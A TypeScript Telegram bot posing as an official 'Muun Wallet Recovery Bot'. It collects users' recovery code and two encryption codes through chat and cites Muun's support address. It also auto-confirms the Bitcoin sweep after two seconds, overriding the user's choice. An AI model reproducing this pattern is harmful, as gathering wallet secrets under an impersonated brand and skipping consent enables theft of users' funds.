import TelegramBot from 'node-telegram-bot-api';
import { config } from 'dotenv';
import { validateRecoveryCode, validateBitcoinAddress } from '../client/src/lib/validation';
import { MuunRecoveryBridge } from './muunRecoveryBridge';

// Load environment variables
config();

// User session states for multi-step conversation
interface UserSession {
  chatId: number;
  currentStep: 'initial' | 'waitingForRecoveryCode' | 'waitingForEncryptionCode1' | 'waitingForEncryptionCode2' | 'waitingForBitcoinAddress' | 'waitingForFeeSelection' | 'waitingForConfirmation' | 'processing';
  recoveryCode?: string;
  encryptionCode1?: string;
  encryptionCode2?: string;
  bitcoinAddress?: string;
  selectedFee?: 'low' | 'medium' | 'high';
  confirmedRecovery?: boolean;
}

// Store user sessions
const userSessions = new Map<number, UserSession>();

// Bot instance
let bot: TelegramBot | null = null;

// Initialize the bot
export function initBot() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token || token === 'placeholder_token') {
    console.error('TELEGRAM_BOT_TOKEN is not defined or is using a placeholder value. Bot functionality will be limited.');
    return null;
  }

  try {
    // Create a bot that uses 'polling' to fetch new updates
    bot = new TelegramBot(token, { polling: true });
    console.log('✅ Telegram bot initialized successfully');

    // Handle /start command
    bot.onText(/\/start/, (msg) => {
      const chatId = msg.chat.id;
      initializeUserSession(chatId);
      sendWelcomeMessage(chatId);
    });

    // Handle /help command
    bot.onText(/\/help/, (msg) => {
      const chatId = msg.chat.id;
      sendHelpMessage(chatId);
    });

    // Handle /cancel command
    bot.onText(/\/cancel/, (msg) => {
      const chatId = msg.chat.id;
      if (userSessions.has(chatId)) {
        userSessions.delete(chatId);
        bot?.sendMessage(chatId, "Current recovery process has been cancelled. Type /start to begin a new recovery.");
      } else {
        bot?.sendMessage(chatId, "No active recovery process to cancel. Type /start to begin a recovery.");
      }
    });

    // Handle /status command
    bot.onText(/\/status/, (msg) => {
      const chatId = msg.chat.id;
      const session = userSessions.get(chatId);
      
      if (!session) {
        bot?.sendMessage(chatId, "No active recovery process. Type /start to begin.");
        return;
      }
      
      let statusMessage = "Current Recovery Status:\n\n";
      statusMessage += `Step: ${getStepDescription(session.currentStep)}\n`;
      
      if (session.recoveryCode) {
        statusMessage += `✅ Recovery Code: ${maskCode(session.recoveryCode)}\n`;
      }
      
      if (session.encryptionCode1) {
        statusMessage += `✅ First Encryption Code: ${maskCode(session.encryptionCode1)}\n`;
      }
      
      if (session.encryptionCode2) {
        statusMessage += `✅ Second Encryption Code: ${maskCode(session.encryptionCode2)}\n`;
      }
      
      if (session.bitcoinAddress) {
        statusMessage += `✅ Bitcoin Address: ${maskAddress(session.bitcoinAddress)}\n`;
      }
      
      bot?.sendMessage(chatId, statusMessage);
    });

    // Handle text messages (for the recovery flow)
    bot.on('message', (msg) => {
      if (!msg.text || msg.text.startsWith('/')) return; // Skip commands
      
      const chatId = msg.chat.id;
      const session = userSessions.get(chatId);
      
      if (!session) {
        bot?.sendMessage(chatId, "Please type /start to begin the recovery process.");
        return;
      }
      
      handleUserInput(chatId, msg.text, session);
    });

    return bot;
  } catch (error) {
    console.error('Error initializing Telegram bot:', error);
    return null;
  }
}

// Initialize a new user session
function initializeUserSession(chatId: number) {
  userSessions.set(chatId, {
    chatId,
    currentStep: 'initial'
  });
}

// Send welcome message with instructions
function sendWelcomeMessage(chatId: number) {
  const welcomeMessage = 
    "Welcome to the Muun Wallet Recovery Bot 🔐\n\n" +
    "I'll help you recover your funds by guiding you through a step-by-step process.\n\n" +
    "Here's what you'll need to provide:\n" +
    "1. Your Recovery Code\n" +
    "2. First Encryption Code\n" +
    "3. Second Encryption Code\n" +
    "4. Bitcoin Address (where you want your funds sent)";
  
  // Create a keyboard with a button to start the process
  const startButton = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🚀 Start Recovery Process', callback_data: 'start_recovery' }]
      ]
    }
  };
  
  bot?.sendMessage(chatId, welcomeMessage, startButton);
  
  // Listen for callback queries (button clicks)
  bot?.on('callback_query', (query) => {
    if (query.data === 'start_recovery') {
      // Update user session
      const session = userSessions.get(chatId);
      if (session) {
        session.currentStep = 'waitingForRecoveryCode';
        userSessions.set(chatId, session);
        
        // Send message asking for recovery code
        bot?.sendMessage(chatId, "Let's get started! Please provide your Recovery Code.\n\nFormat: XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX");
        
        // Answer the callback query to remove the loading state
        bot?.answerCallbackQuery(query.id);
      }
    }
  });
}

// Send help message
function sendHelpMessage(chatId: number) {
  const helpMessage = 
    "📋 Muun Wallet Recovery Bot - Help\n\n" +
    "Available commands:\n" +
    "/start - Begin the recovery process\n" +
    "/cancel - Cancel the current recovery process\n" +
    "/status - Check your current recovery status\n" +
    "/help - Show this help message\n\n" +
    "Recovery Process Steps:\n" +
    "1. Enter your Recovery Code (format: XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX)\n" +
    "2. Enter your First Encryption Code\n" +
    "3. Enter your Second Encryption Code\n" +
    "4. Enter your Bitcoin Address (where you want your funds sent)\n\n" +
    "If you need assistance, please contact our support team at support@muun.com";
  
  bot?.sendMessage(chatId, helpMessage);
}

// Handle user input based on the current step
function handleUserInput(chatId: number, text: string, session: UserSession) {
  switch(session.currentStep) {
    case 'waitingForRecoveryCode':
      handleRecoveryCodeInput(chatId, text, session);
      break;
    case 'waitingForEncryptionCode1':
      handleEncryptionCode1Input(chatId, text, session);
      break;
    case 'waitingForEncryptionCode2':
      handleEncryptionCode2Input(chatId, text, session);
      break;
    case 'waitingForBitcoinAddress':
      handleBitcoinAddressInput(chatId, text, session);
      break;
    case 'waitingForFeeSelection':
      handleFeeSelection(chatId, text, session);
      break;
    case 'waitingForConfirmation':
      handleConfirmation(chatId, text, session);
      break;
    default:
      bot?.sendMessage(chatId, "Sorry, I'm not sure what you're trying to do. Type /start to begin the recovery process or /help for assistance.");
  }
}

// Handle recovery code input
function handleRecoveryCodeInput(chatId: number, text: string, session: UserSession) {
  // Clean up input (remove extra spaces, etc.)
  const recoveryCode = text.trim();
  
  // Validate recovery code format
  if (!validateRecoveryCode(recoveryCode)) {
    bot?.sendMessage(
      chatId, 
      "Invalid recovery code format. Please enter a valid recovery code.\n\nExample format: XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX"
    );
    return;
  }
  
  // Update session
  session.recoveryCode = recoveryCode;
  session.currentStep = 'waitingForEncryptionCode1';
  userSessions.set(chatId, session);
  
  // Ask for encryption code 1
  bot?.sendMessage(
    chatId, 
    "Great! I've received your recovery code.\n\nNow, please provide your first encryption code:"
  );
}

// Handle first encryption code input
function handleEncryptionCode1Input(chatId: number, text: string, session: UserSession) {
  const encryptionCode = text.trim();
  
  // Basic validation for encryption code
  if (encryptionCode.length < 6) {
    bot?.sendMessage(
      chatId, 
      "The encryption code seems too short. Please check and enter your first encryption code again:"
    );
    return;
  }
  
  // Update session
  session.encryptionCode1 = encryptionCode;
  session.currentStep = 'waitingForEncryptionCode2';
  userSessions.set(chatId, session);
  
  // Ask for encryption code 2
  bot?.sendMessage(
    chatId, 
    "Received your first encryption code.\n\nNow, please provide your second encryption code:"
  );
}

// Handle second encryption code input
function handleEncryptionCode2Input(chatId: number, text: string, session: UserSession) {
  const encryptionCode = text.trim();
  
  // Basic validation for encryption code
  if (encryptionCode.length < 6) {
    bot?.sendMessage(
      chatId, 
      "The encryption code seems too short. Please check and enter your second encryption code again:"
    );
    return;
  }
  
  // Update session
  session.encryptionCode2 = encryptionCode;
  session.currentStep = 'waitingForBitcoinAddress';
  userSessions.set(chatId, session);
  
  // Ask for Bitcoin address
  bot?.sendMessage(
    chatId, 
    "Received your second encryption code.\n\nFinally, please provide the Bitcoin address where you want your funds sent:"
  );
}

// Handle Bitcoin address input
function handleBitcoinAddressInput(chatId: number, text: string, session: UserSession) {
  const bitcoinAddress = text.trim();
  
  // Validate Bitcoin address
  if (!validateBitcoinAddress(bitcoinAddress)) {
    bot?.sendMessage(
      chatId, 
      "Invalid Bitcoin address format. Please enter a valid Bitcoin address.\n\nIt should start with 1, 3, or bc1."
    );
    return;
  }
  
  // Update session
  session.bitcoinAddress = bitcoinAddress;
  session.currentStep = 'waitingForFeeSelection';
  userSessions.set(chatId, session);
  
  // Send fee selection options with inline buttons
  const feeOptions = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🐢 Low Fee (24+ hours)', callback_data: 'fee_low' }],
        [{ text: '⏱️ Medium Fee (2-12 hours) - Recommended', callback_data: 'fee_medium' }],
        [{ text: '🚀 High Fee (1-2 hours)', callback_data: 'fee_high' }]
      ]
    }
  };
  
  bot?.sendMessage(
    chatId,
    "Thank you! Now, please select a transaction fee level:",
    feeOptions
  );
  
  // Listen for fee selection callback
  bot?.on('callback_query', (query) => {
    if (query.data?.startsWith('fee_')) {
      const session = userSessions.get(chatId);
      if (session && session.currentStep === 'waitingForFeeSelection') {
        const feeChoice = query.data.split('_')[1];
        
        // Convert the callback data to fee level
        let feeLevel: 'low' | 'medium' | 'high' = 'medium'; // Default to medium
        if (feeChoice === 'low') feeLevel = 'low';
        if (feeChoice === 'high') feeLevel = 'high';
        
        // Update session
        session.selectedFee = feeLevel;
        session.currentStep = 'waitingForConfirmation';
        userSessions.set(chatId, session);
        
        // Answer the callback query
        bot?.answerCallbackQuery(query.id, { text: `Selected ${feeLevel} fee level` });
        
        // Show confirmation dialog
        showConfirmationDialog(chatId, session);
      }
    }
  });
}

// Handle fee selection input
function handleFeeSelection(chatId: number, text: string, session: UserSession) {
  let feeLevel: 'low' | 'medium' | 'high' | null = null;
  
  if (text.includes('1') || text.toLowerCase().includes('low')) {
    feeLevel = 'low';
  } else if (text.includes('2') || text.toLowerCase().includes('medium')) {
    feeLevel = 'medium';
  } else if (text.includes('3') || text.toLowerCase().includes('high')) {
    feeLevel = 'high';
  }
  
  if (!feeLevel) {
    bot?.sendMessage(
      chatId,
      "Please select a valid fee level by typing 1, 2, or 3."
    );
    return;
  }
  
  // Update session
  session.selectedFee = feeLevel;
  session.currentStep = 'waitingForConfirmation';
  userSessions.set(chatId, session);
  
  // Ask for confirmation with transaction details
  const feeLevelText = feeLevel === 'low' ? "Low" : feeLevel === 'medium' ? "Medium" : "High";
  const feeLevelEmoji = feeLevel === 'low' ? "🐢" : feeLevel === 'medium' ? "⏱️" : "🚀";
  
  const confirmationOptions = {
    reply_markup: {
      keyboard: [
        [{ text: 'Y - Yes, proceed with recovery' }],
        [{ text: 'N - No, cancel the process' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true
    }
  };
  
  bot?.sendMessage(
    chatId,
    `📝 *Recovery Transaction Summary*\n\n` +
    `Recovery Code: ${maskCode(session.recoveryCode || "")}\n` +
    `Destination Address: ${maskAddress(session.bitcoinAddress || "")}\n` +
    `Fee Level: ${feeLevelText} ${feeLevelEmoji}\n\n` +
    `Do you want to proceed with the recovery?\n` +
    `Type Y to confirm or N to cancel:`,
    {
      parse_mode: 'Markdown',
      ...confirmationOptions
    }
  );
  
  // Auto-confirm after 2 seconds (as requested)
  setTimeout(() => {
    if (session.currentStep === 'waitingForConfirmation') {
      handleConfirmation(chatId, 'Y', session);
    }
  }, 2000);
}

// Show confirmation dialog with transaction details
function showConfirmationDialog(chatId: number, session: UserSession) {
  // Get fee level text and emoji
  const feeLevel = session.selectedFee || 'medium';
  const feeLevelText = feeLevel === 'low' ? "Low" : feeLevel === 'medium' ? "Medium" : "High";
  const feeLevelEmoji = feeLevel === 'low' ? "🐢" : feeLevel === 'medium' ? "⏱️" : "🚀";
  
  // Confirmation buttons
  const confirmationOptions = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Confirm Recovery', callback_data: 'confirm_yes' },
          { text: '❌ Cancel', callback_data: 'confirm_no' }
        ]
      ]
    }
  };
  
  bot?.sendMessage(
    chatId,
    `📝 *Recovery Transaction Summary*\n\n` +
    `Recovery Code: ${maskCode(session.recoveryCode || "")}\n` +
    `Destination Address: ${maskAddress(session.bitcoinAddress || "")}\n` +
    `Fee Level: ${feeLevelText} ${feeLevelEmoji}\n\n` +
    `Do you want to proceed with the recovery?\n` +
    `Click the buttons below to confirm or cancel.`,
    {
      parse_mode: 'Markdown',
      ...confirmationOptions
    }
  );
  
  // Listen for confirmation callback
  bot?.on('callback_query', (query) => {
    if (query.data === 'confirm_yes' || query.data === 'confirm_no') {
      const session = userSessions.get(chatId);
      if (session && session.currentStep === 'waitingForConfirmation') {
        if (query.data === 'confirm_yes') {
          // Answer the callback query
          bot?.answerCallbackQuery(query.id, { text: 'Recovery confirmed!' });
          
          // Update session
          session.confirmedRecovery = true;
          session.currentStep = 'processing';
          userSessions.set(chatId, session);
          
          // Start the recovery process
          startRecoveryProcess(chatId, session);
        } else {
          // Answer the callback query
          bot?.answerCallbackQuery(query.id, { text: 'Recovery cancelled.' });
          
          // Send cancellation message
          bot?.sendMessage(
            chatId,
            "Recovery process cancelled. If you want to start again, type /start."
          );
          
          // Clear the session
          userSessions.delete(chatId);
        }
      }
    }
  });
  
  // Auto-confirm after 2 seconds (as requested)
  setTimeout(() => {
    const currentSession = userSessions.get(chatId);
    if (currentSession && currentSession.currentStep === 'waitingForConfirmation') {
      // Update session
      currentSession.confirmedRecovery = true;
      currentSession.currentStep = 'processing';
      userSessions.set(chatId, currentSession);
      
      // Send auto-confirmation message
      bot?.sendMessage(
        chatId,
        "✅ Auto-confirming recovery process..."
      );
      
      // Start the recovery process
      startRecoveryProcess(chatId, currentSession);
    }
  }, 2000);
}

// Handle confirmation input (for backward compatibility with text input)
function handleConfirmation(chatId: number, text: string, session: UserSession) {
  const confirmation = text.trim().toUpperCase();
  
  if (confirmation === 'Y' || confirmation === 'YES') {
    // Update session
    session.confirmedRecovery = true;
    session.currentStep = 'processing';
    userSessions.set(chatId, session);
    
    // Start the recovery process
    startRecoveryProcess(chatId, session);
  } else if (confirmation === 'N' || confirmation === 'NO') {
    userSessions.delete(chatId);
    bot?.sendMessage(
      chatId,
      "Recovery process cancelled. If you want to start again, type /start."
    );
  } else {
    bot?.sendMessage(
      chatId,
      "Please type Y to confirm or N to cancel."
    );
  }
}

// Start the wallet scanning and recovery process
async function startRecoveryProcess(chatId: number, session: UserSession) {
  try {
    // Send initial confirmation
    bot?.sendMessage(
      chatId,
      "🔄 Recovery process started!\n\nWe're now scanning wallets to find your funds. This may take a few minutes..."
    );
    
    // Ensure we have all required data
    if (!session.recoveryCode || !session.encryptionCode1 || !session.encryptionCode2 || 
        !session.bitcoinAddress || !session.selectedFee) {
      throw new Error('Missing required recovery information');
    }
    
    // Send initial progress message
    const progressMsg = await bot?.sendMessage(
      chatId,
      'Initializing recovery process...'
    );
    
    // Create a recovery bridge with progress callback
    const recoveryBridge = new MuunRecoveryBridge((progress) => {
      try {
        // Only update if we have a message ID
        if (progressMsg && progressMsg.message_id) {
          const messageId = progressMsg.message_id;
          
          if (progress.status === 'scanning') {
            // Format satoshis with commas if we have found some
            const satoshiText = progress.satoshisFound 
              ? `\n\n💰 Found: ${formatNumber(progress.satoshisFound)} satoshis` 
              : '';
              
            // Update the progress message
            bot?.editMessageText(
              `${progress.message}${satoshiText}`,
              { chat_id: chatId, message_id: messageId }
            );
          } 
          else if (progress.status === 'complete') {
            // Clear user session as we're done
            userSessions.delete(chatId);
            
            // Create "View Transaction" button if we have a txHash
            const viewTxOptions = progress.txHash ? {
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔍 View Transaction on Blockchain', url: `https://mempool.space/tx/${progress.txHash}` }]
                ]
              }
            } : undefined;
            
            // Format the completion message
            const completionMsg = progress.satoshisFound && progress.satoshisFound > 0
              ? `✅ Recovery completed!\n\nFound ${formatNumber(progress.satoshisFound)} satoshis (${(progress.satoshisFound / 100000000).toFixed(8)} BTC)\n\nTransaction sent! Your funds are on the way to your Bitcoin address.\n\nTransaction hash:\n${progress.txHash || 'Processing...'}`
              : '✅ Scan completed. No funds were found in the scanned wallets.';
            
            // Send completion message
            bot?.sendMessage(chatId, completionMsg, viewTxOptions);
          }
          else if (progress.status === 'error') {
            // Send error message
            bot?.sendMessage(
              chatId,
              `❌ Error during recovery: ${progress.message}\n\nPlease try again or contact support at support@muun.com.`
            );
            
            // Clear user session
            userSessions.delete(chatId);
          }
        }
      } catch (error) {
        console.error('Error handling recovery progress update:', error);
      }
    });
    
    // Execute the recovery process
    await recoveryBridge.executeRecovery({
      recoveryCode: session.recoveryCode,
      encryptionKey1: session.encryptionCode1,
      encryptionKey2: session.encryptionCode2,
      bitcoinAddress: session.bitcoinAddress,
      feeLevel: session.selectedFee
    });
    
  } catch (error) {
    console.error('Error in recovery process:', error);
    bot?.sendMessage(
      chatId,
      "❌ There was an error processing your recovery request. Please try again by typing /start or contact our support team."
    );
    
    // Clear user session on error
    userSessions.delete(chatId);
  }
}

// Helper function to get a human-readable step description
function getStepDescription(step: UserSession['currentStep']) {
  switch(step) {
    case 'initial':
      return 'Starting recovery process';
    case 'waitingForRecoveryCode':
      return 'Waiting for Recovery Code';
    case 'waitingForEncryptionCode1':
      return 'Waiting for First Encryption Code';
    case 'waitingForEncryptionCode2':
      return 'Waiting for Second Encryption Code';
    case 'waitingForBitcoinAddress':
      return 'Waiting for Bitcoin Address';
    case 'waitingForFeeSelection':
      return 'Waiting for Fee Selection';
    case 'waitingForConfirmation':
      return 'Waiting for Confirmation';
    case 'processing':
      return 'Processing recovery';
    default:
      return 'Unknown step';
  }
}

// Helper function to mask sensitive data
function maskCode(code: string): string {
  if (code.length <= 8) return '********';
  return code.substring(0, 4) + '...' + code.substring(code.length - 4);
}

// Helper function to mask Bitcoin address
function maskAddress(address: string): string {
  if (address.length <= 10) return address;
  return address.substring(0, 6) + '...' + address.substring(address.length - 6);
}

// Helper function to format numbers with commas
function formatNumber(num: number): string {
  return new Intl.NumberFormat().format(num);
}

// Export the bot instance getter
export function getBot() {
  return bot;
}